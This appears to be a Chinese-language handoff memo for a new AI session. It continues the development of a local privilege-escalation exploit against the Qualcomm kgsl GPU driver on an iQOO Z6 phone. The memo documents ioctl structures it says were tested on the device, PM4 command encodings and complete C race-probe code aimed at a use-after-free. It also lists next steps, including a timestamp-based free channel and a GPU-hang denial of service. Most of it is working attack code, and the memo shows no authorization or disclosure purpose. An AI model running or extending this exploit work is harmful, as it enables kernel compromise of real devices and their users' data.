## 0. 给新会话 AI 的 60 秒摘要

1. **设备**: iQOO Z6 (SM7325), kernel 5.4.281-qgki, BL locked, SELinux enforcing, uid=2000 shell + untrusted_app 两个低权限域。
2. **目标**: 从低权限域触发 GPU 驱动 (kgsl) 的内存腐坏 → 提权。当前攻击线 = **submit→free→realloc 的 in-flight 竞态** (GPU 执行期间释放命令缓冲, 观察写穿到复用页)。
3. **已打通**: app 域下 kgsl 全链 ioctl (alloc/mmap/get_info/drawctxt/submit/free) + PM4 命令流组装 + 33KB APK 10 分钟迭代的探针工作流。
4. **已确认的防线**: free 时 IOMMU 映射同步拆除; mmap 持页引用 (页不立即复用); va 延迟回收。
5. **★★ 判据缺陷 (本文最重要的一节)**: v1-v4 探针的 "GPU 写回" 判定读的是 CPU 自己预写过的内存位置 → **自满足**; 且 CP_MEM_WRITE packet 头编码存疑 → **GPU 是否真的执行过写命令从未被验证**。P0 = 修复 oracle 后重测基线 (§6.1)。
6. 若 P0 确认 GPU 执行原语 → P1 做 IB 长度扫描找竞速窗口; 若 P0 失败 → 先修 PM4 编码; 若窗口结构性关闭 → P2 替代方向 (含被遗忘的 `freememontimestamp` 通道)。

## 3. 核心资产: KGSL ioctl 接口解码表 (实测验证过)

以下全部经真机实测 (以 `jni_uaf4.c` 为准, 它是能跑通全链的参考实现):

```c
/* ===== 1. 打开与上下文 ===== */
int fd = open("/dev/kgsl-3d0", O_RDWR);

/* drawctxt_create: cmd 0xc0080913, len 必须 8 (len=4 会截断 ctxid!) */
unsigned char cb[8]; memset(cb, 0, 8);
*(unsigned int *)cb = 0x12;                 /* flags 必须含 bit1|bit4, 否则 EINVAL */
ioctl(fd, 0xc0080913, cb);
unsigned int ctx = *(unsigned int *)(cb+4); /* ctxid 回写 @+4 */

/* ===== 2. GPU 对象分配 (gpuobj 通道, 与 gpumem 0x34/0x35 双 idr 不互通的旧记录作废:
        本表全部走 gpuobj) ===== */
/* alloc: cmd 0xc0300934, len 0x30 */
unsigned long long b[6]; memset(b, 0, sizeof b);
b[1] = size;                                /* size @ +8 (实测 flags@4=0 可通) */
ioctl(fd, 0xc0300934, b);
unsigned int id = ((unsigned int *)b)[0];   /* id 回写 @ +0 */

/* mmap: offset = id << 12, len 必须 == entry size (否则 -34) */
void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (unsigned long long)id << 12);

/* get_info: cmd 0xc0280936, {u64 gpuaddr@0 (入参 0=按 id 查), u32 id@8, ...} */
unsigned char g[0x28]; memset(g, 0, 0x28);
*(unsigned int *)(g+8) = id;
ioctl(fd, 0xc0280936, g);
unsigned long long va = *(unsigned long long *)g;   /* GPU 侧地址回写 @+0 */

/* free: cmd 0xc0080935, {u32 id@0}; 三重 free 幂等; free-while-mapped ret=0 (mmap 持引用) */
unsigned long long f[2]; memset(f, 0, sizeof f); f[0] = id;
ioctl(fd, 0xc0080935, f);

/* ===== 3. 提交: submit_commands, cmd 0xc038093d, 结构体必须 0x38 字节! ===== */
struct ibdesc {              /* 0x20 */
    unsigned long long gpuaddr;    /* IB 的 GPU 地址 (= 对象 va) */
    unsigned long long hostptr;    /* IB 的 CPU 地址 (内核从这拷贝命令) */
    unsigned long long sizedwords;
    unsigned long long priv;       /* 0 */
};
struct submit_cmds {         /* 必须凑满 0x38 (v4 传 0x28 是栈越界读侥幸成功!) */
    unsigned int ctx, flags;          /* 0x00/0x04 */
    unsigned long long cmdlist;       /* 0x08 → &ibdesc */
    unsigned int numcmds, pad;        /* 0x10 = 1, 0x14 */
    unsigned long long syncobj;       /* 0x18 = 0 */
    unsigned int numsyncs, ts;        /* 0x20 = 0, 0x24 */
    unsigned char tail[0x10];         /* 0x28..0x37 全零 */
};
ioctl(fd, 0xc038093d, &sc);  /* 成功 ret=0 */
```

**PM4 命令流现状 (★ 见 §5.2 判据缺陷)**:
```c
/* v1-v4 使用的 IB 尾部写命令 (执行与否未经正确验证!): */
ib[i++] = 0x70000000;               /* NOP 填充 (500 轮无异常, 大概率无害) */
ib[i++] = 0x903d0004;               /* 疑似 CP_MEM_WRITE(op=0x3d,count=4) — 前缀 9 存疑 */
```

### 5.2 ★★★ 判据缺陷 (Day 78 交接时发现 — 本文档存在的首要原因)
**复盘 v1-v4 的 oracle 设计, 发现两个问题, 意味着此前部分结论需要重新验证:**

**缺陷 A — self 判定自满足**:
v4 (`jni_uaf4.c`) 中 CPU 预写 `ib[53]=0xCAFEBABE` (作为 CP_MEM_WRITE 的 data), 而 self 判定是 `if (ib[53]==0xCAFEBABE) self_hits++` — **读的是 CPU 自己写过的位置**, 无论 GPU 是否执行, 该位置永远是 0xCAFEBABE (v1 的全页扫描 `CAFEBABE+DEADC0DE` 同理, CPU 预写的 IB payload 自身就命中)。v2/v3 的 self=0 说明该位置后来被清 (页回收/零化路径), 但它**从未验证过 "GPU 写到了 va+0x800"**。正确的 self 位置 = **va + IB区之后** 的偏移 (CPU 从不写), 例如 marker 目标设为 `va + ndw*4 + 0x800`。

**缺陷 B — CP_MEM_WRITE 头编码存疑**:
v1-v4 用 `0x903d0004` 作写命令头。内核反汇编中的 type-7 模板 (`0x70268000`/`0x70928000`/`0x70468000`) 反推出编码 `(7<<28)|(op<<16)|cnt` ⇒ op=0x3d 的合法头应为 `0x703d0004`, 前缀 nibble 应为 **7** 而非 9。若 0x903d0004 是非法 packet, GPU 解析器可能跳过/停摆 — **"GPU 任意命令执行" (Day 73 里程碑) 可能整个未生效**。

**连带影响**: §5.1 表中 #3/#5/#7 的 self 维度数据失效, 需按 §6.1 重测; "submit ret=0 / free 幂等 / va 复用" 等与 marker 无关的结论不受影响。

### 5.3 竞速窗口的定位边界 (调参空间)
```
IB 55 dwords (4KB):   GPU 执行 ~µs ≪ free ioctl 往返 ~10µs  → GPU 恒抢先 (待 P0 确认)
IB 0x40000 dwords(1MB): free+unmap 赢 + IOMMU 拆除 + 曾触发 hang      → 窗口被防线盖住
假设: 窗口在中间 → 扫描 {0x2000, 0x8000, 0x20000, 0x3F000} dwords
目标判据: B(spray) 命中 marker = 写穿复用页 = UAF 实锤
```

## 6. 下一步计划 (优先级排序 + 完整代码)

### P0 — 修复 oracle 的无 free 基线实验 (半天)
**目的**: 确认 GPU 真的会执行 CP_MEM_WRITE (两种头对照)。
**方法**: submit 后不 free, sleep 500ms, 读 `va + ndw*4 + 0x800` (CPU 从不写的位置, 提交前有阴性对照)。
**判读**: `0x703d0004` 命中 → 编码修正成功, GPU 执行原语确认; 两种头全 0 → 先修 PM4 (反汇编固件 pm4 表 / WebSearch "a6xx CP_MEM_WRITE type7 packet format" / 对照 mesa `a6xx.xml`), 扫描阶段跳过。

### P1 — IB 长度扫描 (P0 通过后, 1 个会话)
用 P0 胜出的头, 对每个长度 {0x2000, 0x8000, 0x20000, 0x3F000} dwords 跑 100 轮紧凑竞速环 (submit→立即 free→spray×2), 判定矩阵:
| A(marker in A) | B(marker in B) | 结论 |
|---|---|---|
| 1 | 0 | GPU 恒抢先, 窗口未开 → 加大 IB |
| 0 | 0 | free+unmap 赢, 写被 fault → 缩小 IB 或上 submit 风暴 |
| 0/1 | **>0** | **UAF/页复用实锤 → 原语确认, 全力扩大战果** |

```c
static int fd;
static int alloc_obj(unsigned long long size, unsigned int *id) {
    unsigned long long b[6]; memset(b, 0, sizeof b); b[1] = size;
    if (ioctl(fd, 0xc0300934, b)) return -1;
    *id = ((unsigned int *)b)[0]; return 0;
}
static void *mmap_obj(unsigned int id, unsigned long long size) {
    return mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (unsigned long long)id << 12);
}
/* IB: [0..ndw-6]=NOP, 尾 5 dwords = WRITE marker → target (target 必须在 IB 区外!) */
static void fill_ib(unsigned int *ib, unsigned int ndw, unsigned long long target, unsigned int hdr) {
    for (unsigned int i = 0; i + 5 < ndw; i++) ib[i] = 0x70000000;
    unsigned int k = ndw - 5;
    ib[k+0] = hdr;
    ib[k+1] = (unsigned int)(target & 0xffffffff);
    ib[k+2] = (unsigned int)(target >> 32);
    ib[k+3] = 0xCAFEBABE;
    ib[k+4] = 0x00000000;
}
/* 一轮: alloc→mmap→getinfo→填IB→阴性对照→submit→[delay]→读A→[race: free+spray] */
static int round_one(unsigned int ctx, unsigned int ndw, unsigned int hdr,
                     int do_race, unsigned int delay_us,
                     unsigned int *a_hit, unsigned int *b_hit, unsigned int *va_lo)
{
    unsigned long long objsize = (unsigned long long)ndw * 4 + 0x1000; /* IB + marker 区 */
    unsigned int idA;
    if (alloc_obj(objsize, &idA)) return -1;
    unsigned int *ib = mmap_obj(idA, objsize);
    if (ib == MAP_FAILED) return -2;
    unsigned char gA[0x28]; memset(gA, 0, sizeof gA); *(unsigned int *)(gA + 8) = idA;
    ioctl(fd, 0xc0280936, gA);
    unsigned long long vaA = *(unsigned long long *)gA;
    unsigned int mIdx = ndw + 0x200;              /* marker 偏移(dword) = ndw*4 + 0x800 */
    fill_ib(ib, ndw, vaA + (unsigned long long)ndw * 4 + 0x800, hdr);
    if (ib[mIdx] != 0) addf("  !!NEG-CTRL mIdx=%u=%x\n", mIdx, ib[mIdx]);
    struct ibdesc ibd; memset(&ibd, 0, sizeof ibd);
    ibd.gpuaddr = vaA; ibd.hostptr = (unsigned long long)ib; ibd.sizedwords = ndw;
    struct submit_cmds sc; memset(&sc, 0, sizeof sc);
    sc.ctx = ctx; sc.cmdlist = (unsigned long long)&ibd; sc.numcmds = 1;
    int sr = ioctl(fd, 0xc038093d, &sc);
    if (sr) { munmap(ib, objsize); return -3; }
    if (delay_us) usleep(delay_us);
    if (ib[mIdx] == 0xCAFEBABE) (*a_hit)++;       /* GPU 写回自身(位置 CPU 从不写) */
    if (do_race) {
        unsigned long long fA[2]; memset(fA, 0, sizeof fA); fA[0] = idA;
        ioctl(fd, 0xc0080935, fA);                /* 紧凑 free(与 GPU 竞速) */
        for (int s = 0; s < 2; s++) {             /* spray×2 查 marker */
            unsigned int idB;
            if (alloc_obj(objsize, &idB)) break;
            unsigned int *pB = mmap_obj(idB, objsize);
            if (pB == MAP_FAILED) break;
            for (unsigned int d = ndw; d < ndw + 0x400; d++)
                if (pB[d] == 0xCAFEBABE) { (*b_hit)++; addf("  B-HIT s%d d%u\n", s, d); break; }
            unsigned long long fB[2]; memset(fB, 0, sizeof fB); fB[0] = idB;
            ioctl(fd, 0xc0080935, fB);
            munmap(pB, objsize);
        }
    }
    *va_lo = (unsigned int)(vaA & 0xffffffff);
    munmap(ib, objsize);
    return 0;
}
```

### P2 — 替代方向 (P1 判定窗口结构性关闭时)
按性价比排序:
1. **freememontimestamp 通道 (被遗忘的资产!)**: Day 14 逆向定位过 `[entry+0xf0]` = "pending free on timestamp" 标志, 对应 ioctl **0xc0300915** (用户态可指定 timestamp 释放)。Day 1-16 只在 shell 域看静态, **从未在 app 域实测过 free-on-timestamp 与 submit 的竞态** — 若 GPU 按时间戳释放, 可精确控制 "free 时刻 = GPU 执行中" → 窗口确定性打开。动作: app 域探针实测 0xc0300915 结构与行为。
2. **submit 风暴 + 延迟 free**: 多 IB 排队 in-flight, free 落在队列尾部 → unmap 被流水线延迟 → 竞速从"单发 µs"变"排队 ms 级"。
3. **PM4 正面强攻**: 若 P0 两种头都失败, 反汇编固件/内核中的 packet 模板 (RECON Day 4 的 0x70268000/0x70928000/0x70468000 三常量上下文), 或 WebSearch a6xx PM4 规格修编码后再战。
4. **DoS/hang 面 (Day 76 异常)**: 1MB IB + free 的卡死虽非 UAF, 但它是本设备首个"可控异常", 若 P1/P2 全灭可独立成文 (内核 DoS, 影响 kgsl dispatcher)。

## 7. 铁律与坑 (全部踩实过, 违反必翻车)

1. **判据必须有阴性对照** — 自满足判据已坑两次 (38352 的共享内存别名假 WIN; v4 的 self=ib[53])。
2. **ioctl 结构体长度精确** — submit 必须 0x38 (v4 传 0x28 是越界读侥幸); ctxt len=8 (len=4 截断 ctxid)。
3. **trace 双写 + fflush** — 卡死时才有证据; run-as 读取。
4. **崩溃/卡死必归因** — uptime + bootreason; force-stop 是恢复手段; 区分进程卡死 vs 设备重启。
5. **mmap(MAP_SHARED) 共享状态, 不要管道** — EOF/短读已坑 5 次。
6. **bash 前置 export PATH**; adb push 后必 chmod 755; 长任务 setsid。
7. **残留探针进程要清理** (曾 102% CPU 烧 174 分钟)。
8. **打补丁/改代码后 grep 验证关键行** — 锚点静默失效会让人拿旧二进制跑两轮。
9. **marker 目标必须在 CPU 从不写的区域** — 否则判据自满足 (§5.2 缺陷 A 的教训)。
10. **1MB IB 实验risk**: 可能触发 GPU hang (Day 76), 探针要 per-step 可观测, 卡死先 force-stop 别 reboot。
